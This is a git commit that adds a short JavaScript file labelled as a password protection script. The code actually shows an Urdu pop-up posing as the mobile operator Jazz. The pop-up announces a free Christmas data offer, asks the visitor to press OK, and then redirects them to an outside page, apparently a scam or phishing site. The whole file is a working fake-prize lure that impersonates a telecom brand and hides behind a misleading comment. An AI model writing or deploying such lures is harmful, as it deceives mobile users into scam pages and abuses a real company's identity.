bede820e1dec13733f14abc18500ebfd18431d9c
itidnewblog3 <ukpehaitid1@gmail.com>
2025-12-09 10:16:11 +0100

    Create jazz-active.js

---
+++ jazz-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'کرسمس کی پیشکش حاصل کریں۔'
+password = prompt(
+  'Jazz: مبارک ہو! آپ کا موبائل نمبر جاز کی طرف سے مفت ڈیٹا کرسمس جشن کی پیشکش وصول کرنے کا اہل ہے۔ اپنا نمبر درج کرنے کے لیے براہ کرم اوکے کو دبائیں۔',
+  'کرسمس کی پیشکش حاصل کریں۔'
+);
+if (password != 'کرسمس کی پیشکش حاصل کریں۔') {
+  location.href = 'https://lhegit.org/jazz-xmas.html';
+}
